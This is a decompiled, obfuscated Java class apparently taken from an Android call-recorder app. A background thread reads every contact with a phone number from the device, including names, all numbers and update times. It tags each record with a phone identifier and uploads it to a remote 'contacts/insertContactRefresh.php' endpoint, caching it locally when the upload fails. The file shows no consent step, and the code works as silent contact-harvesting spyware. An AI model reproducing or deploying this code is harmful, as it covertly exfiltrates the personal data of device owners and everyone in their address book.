package com.yasoka.spcallrecord.recorder.call.a.c.g;

import a.b.a.a.a;
import a.c.e.e;
import a.c.j.c;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build.VERSION;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.Contacts;
import com.crashlytics.android.Crashlytics;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

/* compiled from: Contact */
public class d extends Thread {

    /* renamed from: a reason: collision with root package name */
    private final Context f219a;

    public d(Context context) {
        this.f219a = context;
    }

    private long a() {
        try {
            Cursor query = this.f219a.getContentResolver().query(Contacts.CONTENT_URI, null, null, null, null);
            if (query != null) {
                if (query.moveToLast()) {
                    return (long) query.getInt(query.getColumnIndexOrThrow("_id"));
                }
                query.close();
            }
        } catch (Exception e2) {
            e2.getStackTrace();
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
        }
        return -1;
    }

    public void run() {
        String str = "data1";
        try {
            String str2 = "contact";
            char c2 = 0;
            long j = this.f219a.getSharedPreferences(str2, 0).getLong(str2, -1);
            if (j == -1) {
                j = a();
                e.a(j, this.f219a);
            }
            if (j != -1) {
                j = a();
                e.a(j, this.f219a);
            }
            if (j != -1) {
                String str3 = "has_phone_number='1' AND _id >= ?";
                String str4 = "_id COLLATE LOCALIZED ASC";
                String str5 = "contact_last_updated_timestamp";
                String str6 = "display_name";
                String str7 = "_id";
                int i = 1;
                String[] strArr = {Long.toString(j)};
                String str8 = str7;
                String str9 = str6;
                Cursor query = this.f219a.getContentResolver().query(Contacts.CONTENT_URI, VERSION.SDK_INT >= 18 ? new String[]{str7, str6, str5} : new String[]{str7, str6}, str3, strArr, str4);
                Uri uri = Phone.CONTENT_URI;
                if (query != null && query.getCount() > 0) {
                    long j2 = -1;
                    while (query.moveToNext()) {
                        String string = query.getString(query.getColumnIndex(str9));
                        long j3 = query.getLong(query.getColumnIndex(str8));
                        SimpleDateFormat d2 = c.d();
                        String format = d2.format(new Date());
                        if (VERSION.SDK_INT >= 18) {
                            long j4 = query.getLong(query.getColumnIndex(str5));
                            Calendar instance = Calendar.getInstance();
                            instance.setTimeInMillis(j4);
                            format = d2.format(instance.getTime());
                        }
                        String str10 = format;
                        String str11 = "";
                        StringBuilder sb = new StringBuilder();
                        sb.append("contact_id=");
                        sb.append(j3);
                        String sb2 = sb.toString();
                        ContentResolver contentResolver = this.f219a.getContentResolver();
                        String[] strArr2 = new String[i];
                        strArr2[c2] = str;
                        String str12 = str10;
                        long j5 = j3;
                        String str13 = string;
                        Cursor query2 = contentResolver.query(uri, strArr2, sb2, null, "is_super_primary DESC");
                        if (query2 != null) {
                            String str14 = str11;
                            while (query2.moveToNext()) {
                                String string2 = query2.getString(query2.getColumnIndex(str));
                                StringBuilder sb3 = new StringBuilder();
                                sb3.append(str14);
                                sb3.append(string2);
                                sb3.append("<br/>");
                                str14 = sb3.toString();
                            }
                            query2.close();
                            str11 = str14;
                        }
                        a(Long.toString(j5), str13, str11, str12);
                        j2 = j5;
                        c2 = 0;
                        i = 1;
                    }
                    query.close();
                    e.a(j2, this.f219a);
                } else if (query != null) {
                    query.close();
                }
            }
        } catch (Exception e2) {
            e2.getStackTrace();
        } catch (Throwable th) {
            th.getStackTrace();
            try {
                th.getStackTrace();
                Crashlytics.logException(th);
            } catch (Exception unused) {
            }
        }
    }

    private void a(String str, String str2, String str3, String str4) {
        HashMap hashMap = new HashMap();
        String str5 = "";
        StringBuilder a2 = a.a(str5);
        a2.append(e.e(this.f219a));
        hashMap.put("idPhone", a2.toString());
        StringBuilder sb = new StringBuilder();
        sb.append(str5);
        sb.append(str);
        hashMap.put("idContact", sb.toString());
        StringBuilder sb2 = new StringBuilder();
        sb2.append(str5);
        sb2.append(str2);
        hashMap.put("name", sb2.toString());
        StringBuilder sb3 = new StringBuilder();
        sb3.append(str5);
        sb3.append(str3);
        hashMap.put("number", sb3.toString());
        StringBuilder sb4 = new StringBuilder();
        sb4.append(str5);
        sb4.append(str4);
        hashMap.put("date", sb4.toString());
        if (!a.c.e.a.b("contacts/insertContactRefresh.php", (Map<String, String>) hashMap)) {
            StringBuilder sb5 = new StringBuilder();
            sb5.append(str5);
            sb5.append(str);
            a.a.a(str3, str2, sb5.toString(), str4);
        }
    }
}
